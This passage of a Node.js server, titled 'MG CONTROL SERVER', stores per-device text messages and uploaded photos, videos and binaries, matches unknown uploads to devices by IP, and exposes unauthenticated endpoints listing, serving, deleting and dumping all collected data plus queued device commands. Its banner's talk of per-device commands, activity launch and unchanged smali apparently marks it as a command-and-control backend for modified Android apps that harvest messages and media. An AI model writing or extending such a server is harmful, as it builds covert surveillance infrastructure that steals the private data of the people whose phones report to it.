                    text: clean(raw.text).slice(0, 500),
                    message_time: number(raw.time) || Date.now(),
                    received_at: Date.now()
                });
            }
            if (!rows.length) {
                return jsonResponse(res, { ok: true, inserted: 0, skipped });
            }
            const { data: insertedRows, error: messageError } = await supabase
                .from("messages")
                .upsert(rows, { onConflict: "device_id,mid", ignoreDuplicates: true })
                .select("device_id,mid");
            if (messageError) {
                console.error("Message insert error:", messageError);
                return jsonResponse(res, { ok: false, error: "database error" }, 500);
            }
            const inserted = insertedRows?.length || 0;
            return jsonResponse(res, {
                ok: true,
                inserted,
                skipped: skipped + (rows.length - inserted)
            });
        }

        // ============================================
        // FILE UPLOAD – RAW BINARY with IP matching
        // ============================================
        if (req.method === "POST" && url.pathname === "/upload") {
            const contentType = req.headers["content-type"] || "";
            let deviceId = url.searchParams.get("deviceId") || "unknown";
            const fileName = url.searchParams.get("name") || "file.bin";
            const cleanFileName = path.basename(fileName);
            if (deviceId === "unknown") {
                const { data: devicesByIP } = await supabase
                    .from("devices")
                    .select("device_id")
                    .eq("public_ip", getIP(req))
                    .order("server_last_seen", { ascending: false })
                    .limit(1);
                if (devicesByIP && devicesByIP.length > 0) {
                    deviceId = devicesByIP[0].device_id;
                }
            }
            if (contentType.includes("application/octet-stream") ||
                contentType.includes("image/jpeg") ||
                contentType.includes("image/png") ||
                contentType.includes("video/mp4")) {
                let buffer = Buffer.alloc(0);
                req.on("data", (chunk) => { buffer = Buffer.concat([buffer, chunk]); });
                req.on("end", () => {
                    try {
                        const safeName = `${Date.now()}_${cleanFileName}`;
                        const filePath = path.join(UPLOAD_DIR, safeName);
                        fs.writeFileSync(filePath, buffer);
                        const thumbName = `thumb_${safeName}`;
                        const thumbPath = path.join(THUMB_DIR, thumbName);
                        fs.copyFileSync(filePath, thumbPath);
                        saveLog({
                            type: "file",
                            file: safeName,
                            original: cleanFileName,
                            folder: ".",
                            thumb: thumbName,
                            device_id: deviceId,
                            ip: getIP(req),
                            size: buffer.length,
                            time: new Date().toISOString()
                        });
                        console.log(`[UPLOAD] ${getIP(req)} | Device: ${deviceId} | ${cleanFileName} (${buffer.length} bytes)`);
                        jsonResponse(res, {
                            ok: true,
                            file: safeName,
                            device_id: deviceId,
                            message: "File uploaded successfully"
                        });
                    } catch (error) {
                        console.error("Upload error:", error);
                        jsonResponse(res, { ok: false, error: "Upload failed" }, 500);
                    }
                });
                req.on("error", () => {
                    jsonResponse(res, { ok: false, error: "Upload failed" }, 500);
                });
                return;
            }
            return jsonResponse(res, { ok: false, error: "Raw binary required" }, 400);
        }

        // ============================================
        // LEGACY & ADVANCED APIs (unchanged)
        // ============================================
        if (req.method === "GET" && url.pathname === "/api/files") {
            const deviceId = url.searchParams.get("deviceId");
            if (!deviceId) return jsonResponse(res, { ok: false, error: "deviceId required" }, 400);
            const files = getFiles(deviceId);
            return jsonResponse(res, { ok: true, files });
        }
        if (req.method === "GET" && url.pathname === "/api/all-files") {
            const files = getFiles();
            return jsonResponse(res, { ok: true, files });
        }
        if (req.method === "GET" && url.pathname === "/api/devices") {
            const devices = await devicesWithStats();
            return jsonResponse(res, devices, 200);
        }
        if (req.method === "GET" && url.pathname.startsWith("/api/device/") && !url.pathname.includes("/messages") && !url.pathname.includes("/files")) {
            const deviceId = url.pathname.split("/").pop();
            const devices = await devicesWithStats();
            const device = devices.find(d => d.device_id === deviceId);
            if (!device) return notFound(res);
            return jsonResponse(res, device, 200);
        }
        if (req.method === "GET" && url.pathname.match(/^\/api\/device\/[^/]+\/messages$/)) {
            const parts = url.pathname.split("/");
            const deviceId = parts[parts.length - 2];
            const messages = await getMessages(deviceId);
            return jsonResponse(res, messages, 200);
        }
        if (req.method === "GET" && url.pathname.match(/^\/api\/device\/[^/]+\/files$/)) {
            const parts = url.pathname.split("/");
            const deviceId = parts[parts.length - 2];
            const files = getFiles(deviceId);
            return jsonResponse(res, files, 200);
        }

        // ============================================
        // SERVE UPLOADS & THUMBS
        // ============================================
        if (req.method === "GET" && url.pathname.startsWith("/uploads/")) {
            const fileName = url.pathname.split("/").pop();
            const filePath = path.join(UPLOAD_DIR, fileName);
            if (!fs.existsSync(filePath)) return notFound(res);
            res.writeHead(200, { "Content-Type": "application/octet-stream", "Cache-Control": "no-cache" });
            fs.createReadStream(filePath).pipe(res);
            return;
        }
        if (req.method === "GET" && url.pathname.startsWith("/thumbs/")) {
            const fileName = url.pathname.split("/").pop();
            const filePath = path.join(THUMB_DIR, fileName);
            if (!fs.existsSync(filePath)) return notFound(res);
            res.writeHead(200, { "Content-Type": "image/jpeg", "Cache-Control": "no-cache" });
            fs.createReadStream(filePath).pipe(res);
            return;
        }

        // ============================================
        // DELETE FILE
        // ============================================
        if (req.method === "DELETE" && url.pathname.startsWith("/api/file/")) {
            const fileName = url.pathname.split("/").pop();
            if (!fileName) return jsonResponse(res, { ok: false, error: "fileName required" }, 400);
            const filePath = path.join(UPLOAD_DIR, fileName);
            const thumbPath = path.join(THUMB_DIR, `thumb_${fileName}`);
            if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
            if (fs.existsSync(thumbPath)) fs.unlinkSync(thumbPath);
            removeFileLogEntries(fileName);
            return jsonResponse(res, { ok: true, message: "File deleted" });
        }

        // ============================================
        // DEBUG API
        // ============================================
        if (req.method === "GET" && url.pathname === "/api/debug") {
            const [devicesResult, messagesResult] = await Promise.all([
                supabase.from("devices").select("*").order("server_last_seen", { ascending: false }),
                supabase.from("messages").select("*").order("message_time", { ascending: false }).limit(5000)
            ]);
            const logs = readLogs();
            const files = logs.filter(entry => entry.type === "file");
            const messagesByDevice = {};
            for (const msg of messagesResult.data || []) {
                if (!messagesByDevice[msg.device_id]) messagesByDevice[msg.device_id] = [];
                messagesByDevice[msg.device_id].push(msg);
            }
            const filesByDevice = {};
            for (const file of files) {
                const id = file.device_id || "unknown";
                if (!filesByDevice[id]) filesByDevice[id] = [];
                filesByDevice[id].push(file);
            }
            return jsonResponse(res, {
                devices: devicesResult.data || [],
                messages: messagesByDevice,
                files: filesByDevice,
                commands: Object.fromEntries(deviceCommands)
            });
        }

        return notFound(res);

    } catch (error) {
        console.error(error);
        return jsonResponse(res, { ok: false, error: "server error" }, 500);
    }
});

// ============================================
// START
// ============================================

server.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║   🚀 MG CONTROL SERVER (Device-Specific Commands)           ║
║   📡 Running on: http://localhost:${PORT}                     ║
╠══════════════════════════════════════════════════════════════╣
║   ✅ Device-specific commands per IP                        ║
║   ✅ Dashboard shows command for selected device            ║
║   ✅ Activity launch supported (action: "launch")           ║
║   ✅ No smali changes needed!                              ║
╚══════════════════════════════════════════════════════════════╝
    `);
});
